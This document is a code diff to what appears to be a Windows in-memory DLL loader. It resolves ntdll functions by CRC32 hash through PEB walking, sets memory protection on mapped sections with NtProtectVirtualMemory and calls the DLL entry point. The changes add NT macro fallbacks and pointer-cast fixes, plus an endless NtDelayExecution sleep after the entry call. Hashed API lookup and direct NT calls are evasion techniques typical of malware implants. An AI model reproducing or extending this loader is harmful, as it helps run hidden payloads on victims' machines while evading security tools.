@@ -2,6 +2,27 @@
 #include "peb.h"
 #include "dll.h"
 
+#ifndef OBJ_CASE_INSENSITIVE
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+#endif
+
+#ifndef FILE_OPEN_IF
+#define FILE_OPEN_IF 0x00000003
+#endif
+
+#ifndef InitializeObjectAttributes
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)->Length = sizeof( OBJECT_ATTRIBUTES ); \
+    (p)->RootDirectory = r; \
+    (p)->Attributes = a; \
+    (p)->ObjectName = n; \
+    (p)->SecurityDescriptor = s; \
+    (p)->SecurityQualityOfService = NULL; \
+}
+#endif
+
+// ml64.exe /c peb.masm /Fo peb.obj
+
 void *mc(void* dest, const void* src, size_t n){
     char* d = (char*)dest;
     const char* s = (const char*)src;
@@ -185,7 +206,7 @@ int dll_start() {
             void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
             NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
             size_t size = section_header->SizeOfRawData;
-            void *address = dll_base + section_header->VirtualAddress;
+            void *address = (char*)dll_base + section_header->VirtualAddress;
             if((status = g_nt_protect_virtual_memory(((HANDLE) -1), &address, &size, protect, &protect)) != 0x0)
                 return -7;     }
     }
@@ -348,7 +369,7 @@ int start() {
                 protect |= PAGE_NOCACHE;
 
             size_t size = section_header->SizeOfRawData;
-            void *address = dll_base + section_header->VirtualAddress;
+            void *address = (char*)dll_base + section_header->VirtualAddress;
 
             void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
             NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
@@ -372,6 +393,10 @@ int start() {
 
     DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
     (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
+    NtDelayExecution_t sleep = (NtDelayExecution_t)get_proc_address_by_hash(p_ntdll, NtDelayExecution_CRC32b);
+	LARGE_INTEGER interval;
+	interval.QuadPart = -31556952000000000LL;
+	while (1) sleep(FALSE, &interval);
 
     void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
     NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
